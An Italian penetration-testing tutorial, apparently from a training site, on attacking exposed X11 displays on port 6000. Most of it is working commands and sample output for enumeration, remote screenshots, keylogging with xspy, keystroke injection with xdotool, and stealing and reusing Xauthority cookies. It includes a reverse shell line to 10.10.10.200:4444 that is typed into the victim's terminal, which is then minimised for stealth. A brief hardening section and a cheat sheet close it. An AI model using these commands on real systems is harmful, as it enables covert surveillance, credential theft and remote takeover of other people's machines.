---
title: 'Porta 6000 X11: Screenshot, Keylogging e Desktop Hijack'
slug: porta-6000-x11
description: >-
  Porta 6000 X11 nel pentest: display remoto esposto, screenshot del desktop,
  keylogging, input injection e session hijacking su sistemi Linux e Unix.
image: /porta-6000-x11.webp
draft: false
date: 2026-04-15T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - MIT-MAGIC-COOKIE
  - X11
  - Desktop Hijacking
---

X11 (X Window System) è il protocollo grafico che gestisce la visualizzazione del desktop su sistemi Linux e Unix. Ascolta sulla port 6000 TCP (display `:0`; display `:1` = porta 6001, e così via). Quando X11 è esposto sulla rete — cosa che non dovrebbe mai accadere ma che succede con sorprendente frequenza — un attaccante può **vedere in tempo reale tutto ciò che appare sullo schermo**, **registrare ogni tasto premuto** (keylogging) e **iniettare input** (tastiera e mouse) come se fosse seduto davanti al computer. A differenza di [VNC](https://hackita.it/articoli/porta-5900-vnc) che è un protocollo di condivisione desktop, X11 è il display server stesso — il livello più basso. Compromettere X11 significa avere il controllo totale dell'interfaccia grafica.

Il problema storico di X11 è il meccanismo di accesso: il comando `xhost +` disabilita completamente l'autenticazione, permettendo a qualsiasi host di connettersi. Questa configurazione è stata usata per decenni come "soluzione rapida" per far funzionare applicazioni grafiche remote e viene ancora trovata in ambienti legacy, server di sviluppo e sistemi accademici.

## Come Funziona X11

```
X11 Client (App)                   X11 Server (:6000)
┌──────────────┐                   ┌──────────────────────┐
│ Firefox      │                   │ Display :0            │
│ Terminal     │── X11 protocol ──►│  ├── Rendering grafico│
│ File Manager │                   │  ├── Input (tastiera) │
│              │ ◄── eventi ──────│  └── Input (mouse)    │
└──────────────┘                   └──────────────────────┘

Attacker (remoto)
┌──────────────┐
│ xwd          │── connect :6000──► Screenshot del desktop
│ xspy/xinput  │── connect :6000──► Keylogging
│ xdotool      │── connect :6000──► Injection tastiera/mouse
└──────────────┘
```

**Nota terminologica:** in X11, il "server" è la macchina con lo schermo (il target), il "client" è l'applicazione che vuole visualizzare qualcosa. L'attaccante si connette al X11 server del target.

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 6000-6005 10.10.10.40
```

```
PORT     STATE SERVICE VERSION
6000/tcp open  X11     (access denied)
6001/tcp open  X11
```

`access denied` → X11 è attivo ma l'autenticazione blocca la connessione.
Porta 6001 aperta senza `access denied` → possibile accesso al display `:1`.

### Nmap script

```bash
nmap -p 6000 --script=x11-access 10.10.10.40
```

```
PORT     STATE SERVICE
6000/tcp open  X11
| x11-access:
|   X11 access: OPEN
|_  No authentication required
```

**OPEN — No authentication required** → accesso completo al desktop senza credenziali.

### Test manuale

```bash
# Imposta la variabile DISPLAY per puntare al target
export DISPLAY=10.10.10.40:0

# Prova a listare le finestre
xwininfo -root -tree -display 10.10.10.40:0
```

```
xwininfo: Window id: 0x200001 (the root window)
  Root window id: 0x200001 (the root window)
  ...
  2 children:
  0x3c00001 "root@server: /home/admin": ("xterm" "XTerm")  600x400+100+100  +100+100
  0x3e00001 "Firefox": ("Navigator" "Firefox")  1200x800+0+0  +0+0
```

Due finestre aperte: un terminale xterm come root e Firefox. Puoi vedere e interagire con entrambe.

## 2. Screenshot del Desktop

### xwd (X Window Dump)

```bash
# Cattura l'intero desktop
xwd -root -display 10.10.10.40:0 -out screenshot.xwd

# Converti in formato leggibile
convert screenshot.xwd screenshot.png
```

```bash
# Cattura una finestra specifica
xwd -id 0x3c00001 -display 10.10.10.40:0 -out terminal.xwd
```

### Screenshot continuo (monitoring)

```bash
# Cattura uno screenshot ogni 5 secondi
while true; do
    xwd -root -display 10.10.10.40:0 -out "screen_$(date +%s).xwd"
    sleep 5
done
```

### Con Metasploit

```bash
use auxiliary/gather/x11_keyboard_spy
set RHOSTS 10.10.10.40
set DISPLAY :0
run
```

## 3. Keylogging — Cattura Ogni Tasto Premuto

### xspy

```bash
# Registra ogni keystroke in tempo reale
xspy -display 10.10.10.40:0
```

```
s u d o   p a s s w o r d :   R 0 0 t _ P @ s s 2 0 2 5 ! [Return]
s s h   a d m i n @ 1 0 . 1 0 . 1 0 . 5 0 [Return]
```

L'utente ha digitato la password di root (`R00t_P@ss2025!`) e si è connesso in SSH a un'altra macchina → credenziali e nuovo target.

### xinput (alternativa moderna)

```bash
# Lista dispositivi di input
xinput list --display 10.10.10.40:0

# Monitor keypress su un dispositivo specifico
xinput test DEVICE_ID --display 10.10.10.40:0
```

### xdotool per leggere il titolo della finestra attiva

```bash
# Mostra il titolo della finestra in focus (cosa sta facendo l'utente)
while true; do
    xdotool getactivewindow getwindowname --display 10.10.10.40:0
    sleep 2
done
```

```
root@server: /etc — xterm
Gmail - Inbox - Mozilla Firefox
server-prod — SSH — Terminal
```

L'utente sta lavorando su file di configurazione, leggendo email e ha una sessione SSH aperta verso production.

## 4. Injection — Iniettare Tastiera e Mouse

### xdotool

```bash
# Scrivi testo come se fosse digitato dall'utente
xdotool type --display 10.10.10.40:0 "whoami"
xdotool key --display 10.10.10.40:0 Return

# Combinazione di tasti (apri terminale)
xdotool key --display 10.10.10.40:0 ctrl+alt+t
sleep 2
xdotool type --display 10.10.10.40:0 "bash -i >& /dev/tcp/10.10.10.200/4444 0>&1"
xdotool key --display 10.10.10.40:0 Return
```

Hai aperto un terminale e lanciato una reverse shell — senza che l'utente debba fare niente.

### xte (xautomation)

```bash
# Muovi il mouse e clicca
xte -x 10.10.10.40:0 "mousemove 500 300" "mouseclick 1"

# Digita testo
xte -x 10.10.10.40:0 "str reverse_shell_command" "key Return"
```

### Reverse shell completa via X11 injection

```bash
# 1. Apri terminale
xdotool key --display 10.10.10.40:0 ctrl+alt+t
sleep 2

# 2. Lancia reverse shell
xdotool type --display 10.10.10.40:0 "bash -c 'bash -i >& /dev/tcp/10.10.10.200/4444 0>&1' &"
xdotool key --display 10.10.10.40:0 Return

# 3. Minimizza il terminale (stealth)
xdotool key --display 10.10.10.40:0 super+h
```

## 5. Leggere il Cookie Xauthority

Se X11 non è completamente aperto (`xhost +`) ma usa MIT-MAGIC-COOKIE, il cookie `.Xauthority` è necessario per connettersi. Se lo ottieni (via [NFS](https://hackita.it/articoli/porta-2049-nfs), [SMB](https://hackita.it/articoli/smb), LFI o shell limitata):

```bash
# Trova il file .Xauthority
find / -name ".Xauthority" 2>/dev/null
```

```bash
# Copia e usa il cookie
export XAUTHORITY=/tmp/stolen_Xauthority
xwd -root -display 10.10.10.40:0 -out screenshot.xwd
```

```bash
# Leggi il contenuto del cookie
xauth -f /home/user/.Xauthority list
```

```
server/unix:0  MIT-MAGIC-COOKIE-1  abc123def456789
```

```bash
# Aggiungi il cookie al tuo xauth
xauth add 10.10.10.40:0 MIT-MAGIC-COOKIE-1 abc123def456789
```

## 6. Post-Exploitation

### Da X11 a shell privilegiata

Se vedi un terminale root sullo schermo → inietta comandi direttamente.

Se non c'è un terminale aperto → aprine uno con `xdotool key ctrl+alt+t` e verifica chi sei.

### Credenziali da osservazione

Il keylogging via X11 cattura:

* Password digitate in `sudo`, `su`, `ssh`
* Credenziali di login web (form nel browser)
* Token e chiavi copiate/incollate
* Comandi con credenziali inline (`mysql -u root -p'password'`)

### Lateral movement

Hostname e IP catturati dal keylogging o visibili nei terminali → nuovi target per la scansione. Credenziali → test su [SSH](https://hackita.it/articoli/ssh), [RDP](https://hackita.it/articoli/porta-3389-rdp), [MySQL](https://hackita.it/articoli/porta-3306-mysql).

## 7. Detection & Hardening

* **Non esporre mai X11 sulla rete** — `X -nolisten tcp` (default nelle distro moderne)
* **Mai `xhost +`** — disabilita accesso non autenticato
* **Usa Wayland** al posto di X11 — Wayland non ha questo problema architetturale
* **SSH X forwarding** se serve accesso remoto: `ssh -X user@server` (il display non è esposto sulla rete)
* **Firewall** — blocca porte 6000-6063 in ingresso
* **Xauthority con MIT-MAGIC-COOKIE** — non disabilitare l'autenticazione
* **Monitora** connessioni alle porte 6000+ da IP non locali

## 8. Cheat Sheet Finale

| Azione          | Comando                                                    |
| --------------- | ---------------------------------------------------------- |
| Nmap            | `nmap -sV -p 6000-6005 --script=x11-access target`         |
| Test accesso    | `xwininfo -root -tree -display target:0`                   |
| Screenshot      | `xwd -root -display target:0 -out screen.xwd`              |
| Converti        | `convert screen.xwd screen.png`                            |
| Keylogger       | `xspy -display target:0`                                   |
| Injection testo | `xdotool type --display target:0 "command"`                |
| Injection Enter | `xdotool key --display target:0 Return`                    |
| Apri terminale  | `xdotool key --display target:0 ctrl+alt+t`                |
| Finestra attiva | `xdotool getactivewindow getwindowname --display target:0` |
| Leggi Xauth     | `xauth -f /path/.Xauthority list`                          |
| Aggiungi cookie | `xauth add target:0 MIT-MAGIC-COOKIE-1 hex_cookie`         |
| MSF keyspy      | `use auxiliary/gather/x11_keyboard_spy`                    |

***

Riferimento: X Window System Protocol, HackTricks X11, OSCP methodology. Uso esclusivo in ambienti autorizzati. [https://www.pentestpad.com/port-exploit/port-6000-x11-x-window-system](https://www.pentestpad.com/port-exploit/port-6000-x11-x-window-system)

> Vuoi mettere in sicurezza la tua infrastruttura o crescere professionalmente nell'ethical hacking? Scopri la [formazione 1:1 con HackIta](https://hackita.it/formazione) o [testa la sicurezza della tua azienda](https://hackita.it/servizi).
